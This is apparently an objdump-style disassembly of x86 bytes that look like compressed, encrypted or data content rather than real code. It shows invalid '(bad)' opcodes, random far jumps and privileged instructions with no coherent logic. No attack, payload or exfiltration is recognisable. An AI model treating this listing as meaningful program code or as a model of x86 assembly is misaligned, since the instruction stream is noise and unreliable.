  422155:	add    BYTE PTR [ebp+0x0],bl
  422158:	add    BYTE PTR [eax],al
  42215a:	lahf   
  42215b:	jmp    0x53c6:0x2c9f9374
  422162:	sbb    dl,bl
  422164:	repz cwde 
  422166:	mov    esp,0x59f0534a
  42216b:	mov    ecx,0xde09cb08
  422170:	xchg   DWORD PTR [ebx+0x15],eax
  422173:	add    eax,0x91939707
  422178:	loope  0x42212f
  42217a:	(bad)  
  42217b:	imul   esi,edx,0xffffff8a
  42217e:	or     al,BYTE PTR [edi+0x46]
  422181:	mov    esi,0x92a83910
  422186:	mov    dh,0x14
  422188:	pop    ds
  422189:	jae    0x422183
  42218b:	fs push 0x4742839
  422191:	test   eax,0x5690aa4c
  422196:	xchg   ebx,eax
  422197:	and    ebp,DWORD PTR [ecx]
  422199:	jecxz  0x422174
  42219b:	and    al,ch
  42219d:	mov    bl,0x90
  42219f:	mov    ch,bh
  4221a1:	leave  
  4221a2:	mov    al,ds:0x7d658360
  4221a7:	sbb    BYTE PTR [edx+0x578ccf7d],0x42
  4221ae:	daa    
  4221af:	loop   0x42215d
  4221b1:	es xchg esi,eax
  4221b3:	lea    edx,[ecx]
  4221b5:	aaa    
  4221b6:	xchg   ebp,eax
	...
  4221bf:	add    BYTE PTR [eax],al
  4221c1:	add    cl,bl
  4221c3:	mov    dh,0x66
  4221c5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221c8:	std    
  4221c9:	neg    BYTE PTR [esi]
  4221cb:	sub    esp,DWORD PTR [ebx-0x23]
  4221ce:	mov    cl,0x8
  4221d0:	fs mov ebp,0x1d800
  4221d6:	pop    ebp
  4221d7:	add    BYTE PTR [eax],al
  4221d9:	add    BYTE PTR [edx+esi*8],ch
  4221dc:	inc    esi
  4221dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221de:	repz jge 0x422195
  4221e1:	jecxz  0x4221dc
  4221e3:	fdivr  st,st(5)
  4221e5:	push   eax
  4221e6:	data16 sub BYTE PTR [edi+0x37315769],al
  4221ed:	cmp    dh,ah
  4221ef:	sbb    bh,ch
  4221f1:	add    ah,dl
  4221f3:	sub    dl,bh
  4221f5:	leave  
  4221f6:	icebp  
  4221f7:	push   edx
  4221f8:	add    eax,edx
  4221fa:	in     eax,0xab
  4221fc:	mov    ch,0x89
  4221fe:	mov    eax,ds:0x5aab664c
  422203:	xchg   ebx,eax
  422204:	imul   edx,DWORD PTR [ecx+0x33b7211f],0xbf821634
  42220e:	push   edx
  42220f:	dec    eax
  422210:	imul   edi,DWORD PTR [edx],0xffffff9e
  422213:	(bad)  
  422214:	sub    al,0x56
  422216:	sti    
  422217:	ret    
  422218:	fsubr  QWORD PTR ds:0xadd4422f
  42221e:	popf   
  42221f:	gs pop ss
  422221:	jae    0x42227c
  422223:	push   edi
  422224:	add    BYTE PTR [eax-0x69d9c380],0xb9
  42222b:	adc    DWORD PTR [ecx+eiz*2],ecx
  42222e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42222f:	out    dx,eax
  422230:	pop    edx
  422231:	shl    DWORD PTR [esp+edi*4-0x49],1
  422235:	mov    edi,DWORD PTR [ebx+0x0]
	...
  422240:	add    BYTE PTR [eax],al
  422242:	fidiv  DWORD PTR [edx]
  422244:	xchg   edi,eax
  422245:	mov    bh,bh
  422247:	scas   eax,DWORD PTR es:[edi]
  422248:	fbstp  TBYTE PTR [edx+0x3]
  42224b:	inc    ebp
  42224c:	mov    ds:0x3e40755c,eax
  422251:	and    BYTE PTR [ebp-0x28],bl
  422254:	add    DWORD PTR [eax],eax
  422256:	pop    ebp
  422257:	add    BYTE PTR [eax],al
  422259:	add    BYTE PTR [ebx-0x5b],cl
  42225c:	dec    ebp
  42225d:	or     cl,dl
  42225f:	fld    TBYTE PTR [ebp+0x55]
  422262:	aas    
  422263:	das    
  422264:	ja     0x422209
  422266:	cmp    ah,cl
  422268:	pushf  
  422269:	jecxz  0x4222d8
  42226b:	push   es
  42226c:	aam    0xa
  42226e:	xchg   BYTE PTR ds:0x723535c2,bh
  422274:	mov    edx,0x40b7b817
  422279:	dec    ebx
  42227a:	jmp    0x142c9815
  42227f:	xchg   ebp,eax
  422280:	(bad)  
  422281:	into   
  422282:	jo     0x4222a3
  422284:	ret    
  422285:	jmp    0xdc4551
  42228a:	loopne 0x4222d2
  42228c:	pusha  
  42228d:	pop    esp
  42228e:	pushf  
  42228f:	jecxz  0x422245
  422291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422292:	pop    ebp
  422293:	popa   
  422294:	jns    0x4222a5
  422296:	xor    DWORD PTR [esi-0x267c986e],eax
  42229c:	(bad)
  4222a0:	ret    
  4222a1:	push   eax
  4222a2:	and    DWORD PTR [edx+0x1a],esi
  4222a5:	(bad)  
  4222a6:	adc    bl,BYTE PTR [esi]
  4222a8:	adc    DWORD PTR [esp+edx*8],0xffffffb3
  4222ac:	xchg   ebx,eax
  4222ad:	mov    ch,dl
  4222af:	hlt    
  4222b0:	jae    0x422238
  4222b2:	mov    al,0xc6
  4222b4:	sub    al,0xab
  4222b6:	dec    edi
	...
  4222bf:	add    BYTE PTR [eax],al
  4222c1:	add    BYTE PTR [eax-0x1c],cl
  4222c4:	add    ebx,DWORD PTR [ebx-0x8270051]
  4222ca:	pop    esi
  4222cb:	sub    BYTE PTR [eax+0x330b698f],bl
  4222d1:	and    bh,BYTE PTR [edx+0x5d0001d8]
  4222d7:	add    BYTE PTR [eax],al
  4222d9:	add    ah,ch
  4222db:	dec    ecx
  4222dc:	addr16 mov esp,ebx
  4222df:	or     dl,cl
  4222e1:	test   al,0x10
  4222e3:	ja     0x422265
  4222e5:	call   0x5dcaa1ae
  4222ea:	(bad)  
  4222eb:	popa   
  4222ec:	and    esi,ebx
  4222ee:	pop    ebx
  4222ef:	addr16 nop
  4222f1:	je     0x422335
  4222f3:	and    DWORD PTR [edi+0x1f],esp
  4222f6:	adc    edi,DWORD PTR [esi-0x52c36009]
  4222fc:	stos   BYTE PTR es:[edi],al
  4222fd:	data16 jmp 0x4222f1
  422300:	cld    
  422301:	xor    bh,bl
  422303:	adc    ch,BYTE PTR [ecx]
  422305:	inc    edx
  422306:	dec    esi
  422307:	cli    
  422308:	rcl    BYTE PTR [eax],cl
  42230a:	sar    BYTE PTR [esi],1
  42230c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42230d:	cmp    ah,ah
  42230f:	mov    BYTE PTR [edx-0x80],al
  422312:	in     al,0x7d
  422314:	xchg   esi,eax
  422315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422316:	enter  0xc23f,0x99
  42231a:	jae    0x422393
  42231c:	sti    
  42231d:	call   0x72f96b07
  422322:	add    DWORD PTR ds:0xb51c8208,ebx
  422328:	adc    dl,BYTE PTR [ecx+esi*2]
  42232b:	aam    0x34
  42232d:	fcmovne st,st(5)
  42232f:	push   edx
  422330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422331:	pop    ecx
  422332:	inc    eax
  422333:	xor    eax,0x570e37
	...
  422340:	add    BYTE PTR [eax],al
  422342:	push   edx
  422343:	add    al,0xa2
  422345:	xor    dh,0xa6
  422348:	jb     0x42231e
  42234a:	ins    DWORD PTR es:[edi],dx
  42234b:	xor    dh,BYTE PTR [edx]
  42234d:	and    eax,0xb79b4a9
  422352:	pop    ss
  422353:	fld    DWORD PTR [ecx]
  422355:	add    BYTE PTR [ebp+0x0],bl
  422358:	add    BYTE PTR [eax],al
  42235a:	(bad)  
  42235b:	adc    BYTE PTR gs:[ebx+eiz*8],0xbe
  422360:	cwde   
  422361:	(bad)  
  422362:	jmp    FWORD PTR [esi]
  422364:	imul   ecx
  422366:	mov    ecx,0x845152e1
  42236b:	xor    BYTE PTR [eax],dh
  42236d:	mov    edi,DWORD PTR [eax-0x11]
  422370:	push   0xdbe4d42
  422375:	pusha  
  422376:	adc    BYTE PTR [edx],bh
  422378:	fldcw  WORD PTR [ebp+0x3f220c49]
  42237e:	fidiv  WORD PTR [eax-0x20]
  422381:	and    ebx,DWORD PTR [edi]
  422383:	(bad)  
  422384:	push   ss
  422385:	mov    ds:0xd1df11ca,al
  42238a:	jmp    0x984c759a
  42238f:	push   ds
  422390:	frstor [edx]
  422392:	inc    edx
  422393:	jae    0x42239a
  422395:	or     cl,dh
  422397:	push   es
  422398:	leave  
  422399:	xor    al,0xf5
  42239b:	fcom   st(4)
  42239d:	out    0x48,al
  42239f:	arpl   WORD PTR [eax-0x7a],ax
  4223a2:	ret    
  4223a3:	push   ebx
  4223a4:	cmp    DWORD PTR [ebx+0x15],esp
  4223a7:	dec    esp
  4223a8:	retf   
  4223a9:	mov    bh,0x1b
  4223ab:	dec    eax
  4223ac:	adc    DWORD PTR [edi-0x5e70ff41],esi
  4223b2:	shl    DWORD PTR [edi-0x64],0xe2
  4223b6:	inc    DWORD PTR [eax]
	...
  4223c0:	add    BYTE PTR [eax],al
  4223c2:	cmp    BYTE PTR [edx-0x6a],ch
  4223c5:	add    edx,esi
  4223c7:	(bad)  
  4223c8:	mov    ebp,0xdb4ef67b
  4223cd:	out    0xf2,eax
  4223cf:	rol    DWORD PTR [esi],cl
  4223d1:	xchg   edx,eax
  4223d2:	je     0x4223ad
  4223d4:	add    DWORD PTR [eax],eax
  4223d6:	pop    ebp
  4223d7:	add    BYTE PTR [eax],al
  4223d9:	add    BYTE PTR [edi],al
  4223db:	ss cs xchg ebp,eax
  4223de:	cmp    eax,0x2d8a8611
  4223e3:	add    al,0xcb
  4223e5:	and    DWORD PTR [ecx-0xbf3ade5],edi
  4223eb:	push   esi
  4223ec:	and    eax,0x3aaacd77
  4223f1:	ror    BYTE PTR [esi+0x64],1
  4223f4:	rol    DWORD PTR [ebx-0x7f0ec560],1
  4223fa:	into   
  4223fb:	shl    BYTE PTR [edx+0x2b],1
  4223fe:	push   ebp
  4223ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422400:	cs aaa 
  422402:	mov    WORD PTR [ecx],gs
  422404:	dec    edi
  422405:	enter  0xa369,0xc7
  422409:	les    eax,FWORD PTR [edx+0x4e]
  42240c:	push   esi
  42240d:	das    
  42240e:	jge    0x4223b2
  422410:	gs cli 
  422412:	dec    esi
  422413:	sbb    esi,0xfa34a4ed
  422419:	or     eax,esi
  42241b:	jp     0x42245c
  42241d:	hlt    
  42241e:	fmul   st(2),st
  422420:	ss jp  0x422493
  422423:	aam    0xf8
  422425:	test   dh,dl
  422427:	push   ecx
  422428:	idiv   BYTE PTR [edi-0x684c0fef]
  42242e:	add    BYTE PTR [ebx],dl
  422430:	push   esi
  422431:	(bad)  
  422432:	sub    edi,DWORD PTR [ebp+0x64]
  422435:	pushf  
  422436:	mov    edx,0x0
  42243b:	add    BYTE PTR [eax],al
  42243d:	add    BYTE PTR [eax],al
  42243f:	add    BYTE PTR [eax],al
  422441:	add    cl,ch
  422443:	mov    ecx,0xf37a307a
  422448:	jmp    0x422443
  42244a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42244e:	aad    0xb7
  422450:	jle    0x4224c3
  422452:	rcr    ecx,1
  422454:	add    DWORD PTR [eax],eax
  422456:	pop    ebp
  422457:	add    BYTE PTR [eax],al
  422459:	add    BYTE PTR [ecx],ch
  42245b:	push   es
  42245c:	pop    ss
  42245d:	pop    ecx
  42245e:	push   0x1e
  422460:	data16 daa 
  422462:	push   esp
  422463:	icebp  
  422464:	sub    eax,0x4055b7a4
  422469:	xchg   ebp,eax
  42246a:	dec    ebx
  42246b:	sbb    ch,BYTE PTR [edi+ebp*2+0x41614b65]
  422472:	xchg   BYTE PTR [edx],bh
  422474:	pop    edi
  422475:	je     0x4224a0
  422477:	imul   edx,DWORD PTR [edi-0x4118e988],0xffffff8b
  42247e:	repz shr eax,cl
  422481:	stos   DWORD PTR es:[edi],eax
  422482:	retf   
  422483:	dec    edi
  422484:	fild   WORD PTR [edx+ebx*2+0x7c74ce27]
  42248b:	bound  eax,QWORD PTR [ebp+0x24]
  42248e:	push   eax
  42248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422490:	cli    
  422491:	fnsave [ebp-0x19]
  422494:	xchg   edx,eax
  422495:	push   DWORD PTR [ecx]
  422497:	xlat   BYTE PTR ds:[ebx]
  422498:	imul   DWORD PTR [ecx-0x7fe37b03]
  42249e:	mov    ss,edi
  4224a0:	fs xchg ecx,eax
  4224a2:	xchg   ecx,eax
  4224a3:	lock jmp 0xbb617a9a
  4224a9:	pop    esi
  4224aa:	popa   
  4224ab:	fs out 0xeb,eax
  4224ae:	je     0x4224f5
  4224b0:	and    eax,0xe97e711d
  4224b5:	test   BYTE PTR [edi],bh
	...
  4224bf:	add    BYTE PTR [eax],al
  4224c1:	add    BYTE PTR [ebx+0x41],bl
  4224c4:	pop    ebx
  4224c5:	iret   
  4224c6:	pop    ebx
  4224c7:	(bad)  
  4224c9:	aad    0xf
  4224cb:	ss dec esp
  4224cd:	dec    esi
  4224ce:	les    ebx,FWORD PTR [eax-0x67]
  4224d1:	data16 fiadd DWORD PTR cs:[ecx]
  4224d5:	add    BYTE PTR [ebp+0x0],bl
  4224d8:	add    BYTE PTR [eax],al
  4224da:	xchg   esp,eax
  4224db:	int    0x65
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	test   BYTE PTR [ebp-0x12bf6dc5],bh
  4224e4:	push   ebp
  4224e5:	test   al,0x89
  4224e7:	fdiv   st,st(5)
  4224e9:	xor    al,0xd6
  4224eb:	in     al,0xc8
  4224ed:	mov    dl,0x1c
  4224ef:	imul   ebx,edx,0x37
  4224f2:	inc    ebx
  4224f3:	adc    al,0xe0
  4224f5:	ins    DWORD PTR es:[edi],dx
  4224f6:	and    BYTE PTR [eax+0x2],bh
  4224f9:	(bad)  
  4224fa:	ss dec esi
  4224fc:	popf   
  4224fd:	and    WORD PTR [edi-0x6f489],dx
  422504:	iret   
  422505:	pop    ecx
  422506:	aam    0x2b
  422508:	imul   edi,DWORD PTR [esi-0x5ce3c79],0x4f6ae8ee
  422512:	sbb    bh,0x58
  422515:	neg    DWORD PTR [ecx]
  422517:	lods   al,BYTE PTR ds:[esi]
  422518:	jns    0x42249f
  42251a:	cmp    DWORD PTR [eax],eax
  42251c:	jge    0x4224c2
  42251e:	or     BYTE PTR gs:0xb042f9cb,0x83
  422526:	cmp    dl,BYTE PTR fs:[eax+0x2f50e0bf]
  42252d:	fcmove st,st(6)
  42252f:	in     eax,0x6d
  422531:	push   0xffffffe3
  422533:	test   DWORD PTR [eax-0x10],esp
  422536:	aad    0x0
	...
  422540:	add    BYTE PTR [eax],al
  422542:	fwait
  422543:	test   DWORD PTR [ebp+0x3c],esp
  422546:	jg     0x422544
  422548:	(bad)  [edi-0x65be08a1]
  42254e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42254f:	push   0xda8b2559
  422554:	add    DWORD PTR [eax],eax
  422556:	pop    ebp
  422557:	add    BYTE PTR [eax],al
  422559:	add    bl,cl
  42255b:	mov    eax,0xdecd58b6
  422560:	jge    0x4224f8
  422562:	pop    ss
  422563:	aas    
  422564:	call   0x9a791a33
  422569:	call   0xc36b1a2e
  42256e:	fmul   st(6),st
  422570:	push   ss
  422571:	mov    ah,0x8c
  422573:	mov    bl,0xf9
  422575:	call   0xfc77:0x9f2e9b06
  42257c:	es popf 
  42257e:	jns    0x422544
  422580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422581:	jae    0x4225db
  422583:	repnz shl al,0x9e
  422587:	les    esp,FWORD PTR [esi]
  422589:	or     BYTE PTR [ecx-0x67dbfd03],bh
  42258f:	xchg   esi,eax
  422590:	pop    esp
  422591:	dec    edx
  422592:	push   ecx
  422593:	es push ss
  422595:	(bad)  
  422596:	sbb    BYTE PTR [ebp+0x5a4cacc3],dh
  42259c:	cmp    eax,DWORD PTR [eax+0x5747240a]
  4225a2:	in     eax,dx
  4225a3:	sub    eax,0x771d8eb3
  4225a8:	push   cs
  4225a9:	xor    BYTE PTR [ecx+0x66b0374b],0x7b
  4225b0:	daa    
  4225b1:	pop    ecx
  4225b2:	push   cs
  4225b3:	jge    0x4225d1
  4225b5:	test   BYTE PTR [eax+eax*1+0x0],bl
  4225bc:	add    BYTE PTR [eax],al
  4225be:	add    BYTE PTR [eax],al
  4225c0:	add    BYTE PTR [eax],al
  4225c2:	outs   dx,BYTE PTR ds:[esi]
  4225c3:	jae    0x4225b5
  4225c5:	retf   0xcbfd
  4225c8:	jle    0x4225c1
  4225ca:	repz xor eax,0x47c38ce9
  4225d0:	aas    
  4225d1:	cmp    al,ch
  4225d3:	fiadd  DWORD PTR [ecx]
  4225d5:	add    BYTE PTR [ebp+0x0],bl
  4225d8:	add    BYTE PTR [eax],al
  4225da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225db:	scas   al,BYTE PTR es:[edi]
  4225dc:	jb     0x422642
  4225de:	arpl   bx,si
  4225e0:	sar    BYTE PTR [ecx-0x5e],0xe4
  4225e4:	daa    
  4225e5:	retf   
  4225e6:	jge    0x4225dc
  4225e8:	inc    ebp
  4225e9:	xor    al,0x94
  4225eb:	and    DWORD PTR [edi-0x46],0xf750f10
  4225f2:	xor    eax,0x428a3480
  4225f7:	xor    DWORD PTR [eax*4-0x4d5e315b],edx
  4225fe:	test   DWORD PTR [esi],eax
  422600:	fdivp  st(3),st
  422602:	and    eax,0x5b1d2960
  422607:	and    DWORD PTR [ebx+0x782a862b],0xffffffa2
  42260e:	push   0x383a7336
  422613:	jne    0x42261f
  422615:	sub    eax,0x9aad58d5
  42261a:	mov    ah,0x2d
  42261c:	xor    ecx,edx
  42261e:	inc    esi
  42261f:	test   DWORD PTR [ebx+esi*1+0xa],esi
  422623:	mov    dl,0xf4
  422625:	ficom  WORD PTR [ebp+ecx*8+0x2e598acd]
  42262c:	cmp    esp,esi
  42262e:	outs   dx,DWORD PTR ds:[esi]
  42262f:	adc    BYTE PTR [edi+eax*8-0x5ec94880],dh
  422636:	dec    esi
	...
  42263f:	add    BYTE PTR [eax],al
  422641:	add    ch,dh
  422643:	adc    al,0xae
  422645:	adc    ebp,edi
  422647:	mov    ebx,0x84e6f6fd
  42264c:	lds    ebp,FWORD PTR [edx+0x551aa9d8]
  422652:	inc    ebp
  422653:	fild   DWORD PTR [ecx]
  422655:	add    BYTE PTR [ebp+0x0],bl
  422658:	add    BYTE PTR [eax],al
  42265a:	int    0x73
  42265c:	add    eax,0xec4e8c8d
  422661:	in     eax,0x1e
  422663:	inc    eax
  422664:	mov    gs,ebx
  422666:	pop    esi
  422667:	mov    ecx,ecx
  422669:	or     al,0x57
  42266b:	popa   
  42266c:	dec    DWORD PTR [ebp+ebp*4+0x2e4c2d40]
  422673:	xchg   edx,eax
  422674:	and    eax,DWORD PTR [edx-0xbd67488]
  42267a:	mov    cl,BYTE PTR [ecx+0x3b]
  42267d:	stc    
  42267e:	(bad)  
  42267f:	enter  0xb447,0x1d
  422683:	loope  0x422701
  422685:	inc    esi
  422686:	lea    edi,[ebp-0x4f]
  422689:	jg     0x42261b
  42268b:	add    eax,DWORD PTR [ebx+0x4a658596]
  422691:	jb     0x422622
  422693:	fsub   QWORD PTR [eax]
  422695:	inc    esi
  422696:	daa    
  422697:	push   eax
  422698:	(bad)  
  422699:	in     eax,dx
  42269a:	push   ebp
  42269b:	aam    0xbe
  42269d:	retf   
  42269e:	and    BYTE PTR [eax+0x46],dh
  4226a1:	test   al,0x7e
  4226a3:	inc    ebp
  4226a4:	packsswb mm4,QWORD PTR [edi]
  4226a7:	xor    al,0xb3
  4226a9:	pusha  
  4226aa:	cld    
  4226ab:	icebp  
  4226ac:	dec    ecx
  4226ad:	scas   eax,DWORD PTR es:[edi]
  4226ae:	fwait
  4226af:	stc    
  4226b0:	adc    al,0x9a
  4226b2:	lea    eax,[edi-0x25]
  4226b5:	iret   
  4226b6:	mov    ebx,0x0
  4226bb:	add    BYTE PTR [eax],al
  4226bd:	add    BYTE PTR [eax],al
  4226bf:	add    BYTE PTR [eax],al
  4226c1:	add    BYTE PTR [ebx],bh
  4226c3:	mov    cl,0x57
  4226c5:	lock fcomip st,st(6)
  4226c8:	mov    edi,0xbb1c16fb
  4226cd:	shl    dl,0x3b
  4226d0:	and    ebp,0xffffffa2
  4226d3:	fild   DWORD PTR [ecx]
  4226d5:	add    BYTE PTR [ebp+0x0],bl
  4226d8:	add    BYTE PTR [eax],al
  4226da:	aam    0x2
  4226dc:	cdq    
  4226dd:	dec    eax
  4226de:	add    esp,ecx
  4226e0:	pop    esp
  4226e1:	dec    ecx
  4226e2:	dec    eax
  4226e3:	cmp    al,0x3b
  4226e5:	jg     0x4226fd
  4226e7:	and    BYTE PTR [edi],bl
  4226e9:	or     al,0xfb
  4226eb:	or     bl,BYTE PTR [esi+0x31]
  4226ee:	cmp    edx,ebx
  4226f0:	mov    ch,0x96
  4226f2:	stos   DWORD PTR es:[edi],eax
  4226f3:	xor    ch,BYTE PTR [ebx]
  4226f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226f6:	push   ebp
  4226f7:	sub    al,0x83
  4226f9:	cmp    esp,esp
  4226fb:	or     ebp,DWORD PTR [esi]
  4226fd:	adc    eax,0x344949b
  422702:	mov    al,0xe5
  422704:	sbb    DWORD PTR [eax-0x18],0x13da1717
  42270b:	hlt    
  42270c:	mov    ch,0xf7
  42270e:	sahf   
  42270f:	inc    edi
  422710:	faddp  st(1),st
  422712:	inc    edx
  422713:	rcl    DWORD PTR [ebp+eax*4-0xf00d217],0x90
  42271b:	cmp    ch,ch
  42271d:	stos   BYTE PTR es:[edi],al
  42271e:	retf   
  42271f:	in     eax,0xf9
  422721:	add    ebp,DWORD PTR [ecx-0x162b94a2]
  422727:	ror    bl,1
  422729:	add    esp,DWORD PTR [ecx-0x1f]
  42272c:	loop   0x422749
  42272e:	mov    edx,0xde77e26b
  422733:	or     al,0x4c
  422735:	in     eax,0x13
	...
  42273f:	add    BYTE PTR [eax],al
  422741:	add    ah,dl
  422743:	sqrtps xmm6,xmm0
  422746:	(bad)  
  422748:	cmc    
  422749:	das    
  42274a:	sbb    BYTE PTR [eax],cl
  42274c:	xchg   ebx,eax
  42274d:	iret   
  42274e:	iret   
  42274f:	xor    ecx,DWORD PTR [ecx+0x1dbff14]
  422755:	add    BYTE PTR [ebp+0x0],bl
  422758:	add    BYTE PTR [eax],al
  42275a:	mov    esp,0xa28180f3
  42275f:	pop    ebp
  422760:	pushf  
  422761:	mov    esi,0x2048c8ec
  422766:	(bad)  
  422767:	mov    eax,0x7183c635
  42276c:	or     ecx,DWORD PTR [edi+0x2]
  42276f:	mov    ds:0x30e5b31e,eax
  422774:	in     al,0x32
  422776:	faddp  st(1),st
  422778:	sbb    esp,ebp
  42277a:	mov    esi,0x2e9aac0e
  42277f:	scas   al,BYTE PTR es:[edi]
  422780:	dec    edi
  422781:	jl     0x42279d
  422783:	retf   
  422784:	mov    ebp,0xb8d169af
  422789:	mov    ch,BYTE PTR [eax+0x48]
  42278c:	and    ecx,DWORD PTR [eax+0x3c]
  42278f:	test   DWORD PTR [ebx-0x159ef44b],edi
  422795:	xchg   ebx,ebx
  422797:	jae    0x42279c
  422799:	into   
  42279a:	xor    al,0xe7
  42279c:	jne    0x4227d8
  42279e:	add    ecx,DWORD PTR [edx+0x2da05b34]
  4227a4:	es inc ecx
  4227a6:	call   0x9d05:0x75fe2980
  4227ad:	fild   DWORD PTR [eax-0x55]
  4227b0:	cli    
  4227b1:	loopne 0x4227f8
  4227b3:	(bad)  
  4227b4:	das    
  4227b5:	cs xchg edx,eax
	...
  4227bf:	add    BYTE PTR [eax],al
  4227c1:	add    ch,cl
  4227c3:	sub    eax,0xfbf54395
  4227c8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227ce:	in     al,dx
  4227cf:	call   FWORD PTR [ebp+0x1dc5cbf]
  4227d5:	add    BYTE PTR [ebp+0x0],bl
  4227d8:	add    BYTE PTR [eax],al
  4227da:	xor    DWORD PTR [eax],0xffffffed
  4227dd:	add    ecx,DWORD PTR [edx]
  4227df:	js     0x42284f
  4227e1:	xchg   edi,eax
  4227e2:	jmp    0xa79bd95d
  4227e7:	mov    eax,0x7309c905
  4227ec:	push   0x72c63a9
  4227f1:	mov    ebp,DWORD PTR [ebx-0x52]
  4227f4:	and    ebp,edi
  4227f6:	mov    ds:0xc98ebfd3,eax
  4227fb:	test   DWORD PTR ds:0xfda5581b,0x8865f019
  422805:	push   ebx
  422806:	jns    0x422873
  422808:	icebp  
  422809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280a:	pop    ecx
  42280b:	mov    edx,DWORD PTR [eax]
  42280d:	pop    ds
  42280e:	and    eax,0x7582c19c
  422813:	stos   BYTE PTR es:[edi],al
  422814:	mov    esp,gs
  422816:	sbb    edi,DWORD PTR [esi+0xf]
  422819:	inc    ecx
  42281a:	(bad)  
  42281b:	fild   WORD PTR [ebp+0x63]
  42281e:	sub    BYTE PTR [ecx-0x6aa1e8cc],0x4e
  422825:	mov    edi,0xdef710c1
  42282a:	mov    bh,0x6d
  42282c:	pop    ebp
  42282d:	iret   
  42282e:	lods   eax,DWORD PTR ds:[esi]
  42282f:	mov    ecx,0xd1f8e449
  422834:	mov    eax,0xa83e
	...
  422841:	add    BYTE PTR [ebx],dl
  422843:	fs out 0xb,eax
  422846:	test   DWORD PTR [ebx-0xce58301],0x994e4cfc
  422850:	add    eax,0x1dcb98a
  422855:	add    BYTE PTR [ebp+0x0],bl
  422858:	add    BYTE PTR [eax],al
  42285a:	and    al,0x28
  42285c:	sbb    BYTE PTR [eax-0x25c78e9e],ch
  422862:	add    ecx,DWORD PTR [edx-0x69]
  422865:	jbe    0x422809
  422867:	test   ch,ah
  422869:	jp     0x422838
  42286b:	add    ecx,ebx
  42286d:	mov    bl,BYTE PTR [ecx+0x4b0bfb9b]
  422873:	inc    esi
  422874:	mov    WORD PTR [ebx+edx*1-0x70],cs
  422878:	xchg   ebx,eax
  422879:	inc    ecx
  42287a:	stos   BYTE PTR es:[edi],al
  42287b:	nop
  42287c:	loope  0x422839
  42287e:	add    eax,0x6675bad9
  422883:	dec    ecx
  422884:	scas   al,BYTE PTR es:[edi]
  422885:	aad    0x61
  422887:	mov    cl,dl
  422889:	push   ss
  42288a:	ds cli 
  42288c:	sbb    ebx,edi
  42288e:	test   eax,0x8d7df6b9
  422893:	xlat   BYTE PTR ds:[ebx]
  422895:	pop    esp
  422896:	cli    
  422897:	or     dl,BYTE PTR [ebp+0x744b2e02]
  42289d:	cmp    ebp,DWORD PTR [esi]
  42289f:	mov    ds:0xe3a18f24,eax
  4228a4:	mov    bh,0xc6
  4228a6:	test   DWORD PTR [ecx+0x12573e29],ecx
  4228ac:	mov    ?,WORD PTR [ebp+ebp*8-0x5b4dde53]
  4228b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228b4:	out    0xa1,al
  4228b6:	adc    BYTE PTR [eax],al
	...
  4228c0:	add    BYTE PTR [eax],al
  4228c2:	add    dl,BYTE PTR ss:[ebp+0xc]
  4228c6:	jne    0x422927
  4228c8:	jg     0x422904
  4228ca:	clc    
  4228cb:	cs aas 
  4228cd:	push   0x61a4056e
  4228d2:	add    dl,al
  4228d4:	add    DWORD PTR [eax],eax
  4228d6:	pop    ebp
  4228d7:	add    BYTE PTR [eax],al
  4228d9:	add    BYTE PTR [eax+ebp*2],bh
  4228dc:	mov    ch,0xd1
  4228de:	call   0x25f2:0x7e92e295
  4228e5:	shr    DWORD PTR [edi-0x5dee1d49],1
  4228eb:	sahf   
  4228ec:	loop   0x4228b2
  4228ee:	aam    0x7b
  4228f0:	or     esp,DWORD PTR [esi+eax*8+0x4c]
  4228f4:	inc    ebx
  4228f5:	shr    BYTE PTR [ecx+ebp*2+0x2e],cl
  4228f9:	fmulp  st(3),st
  4228fb:	adc    ebp,edx
  4228fd:	jo     0x4228d9
  4228ff:	push   0x4cbcd5d5
  422904:	push   es
  422905:	xchg   edx,eax
  422906:	pop    es
  422907:	cmc    
  422908:	test   eax,edi
  42290a:	mov    ds:0x47f0b245,al
  42290f:	les    eax,FWORD PTR [ebx+0x63]
  422912:	jnp    0x42298b
  422914:	inc    esp
  422915:	adc    al,0x2
  422917:	jge    0x4228ee
  422919:	addr16 sti 
  42291b:	sar    BYTE PTR [ebp-0x29],cl
  42291e:	test   al,0x34
  422920:	hlt    
  422921:	push   ss
  422922:	cmp    eax,0x9b92c9e5
  422927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422928:	sbb    BYTE PTR [edx+0x36c313e0],bl
  42292e:	mov    eax,ds:0x637d5f2a
  422933:	test   eax,0x723540
	...
  422940:	add    BYTE PTR [eax],al
  422942:	or     BYTE PTR [ecx-0x404c48e],dh
  422948:	dec    ecx
  422949:	mov    bl,0x94
  42294b:	je     0x422924
  42294d:	call   0xd05f:0xc845a00b
  422954:	add    DWORD PTR [eax],eax
  422956:	pop    ebp
  422957:	add    BYTE PTR [eax],al
  422959:	add    BYTE PTR [eax],al
  42295b:	add    DWORD PTR [eax+0x54],0xffffffb3
  42295f:	retf   0xe94b
  422962:	js     0x422999
  422964:	fnsave [edi+0x1b330d03]
  42296a:	mov    edi,DWORD PTR [esi+0x44121841]
  422970:	test   DWORD PTR [ecx+edi*2-0x5f],esi
  422974:	xchg   BYTE PTR [ebp+0x36b1cd73],ch
  42297a:	js     0x4229be
  42297c:	add    BYTE PTR [ebx],0x39
  42297f:	mov    ch,BYTE PTR [edx]
  422981:	jne    0x422938
  422983:	ret    
  422984:	mov    ah,0xda
  422986:	popa   
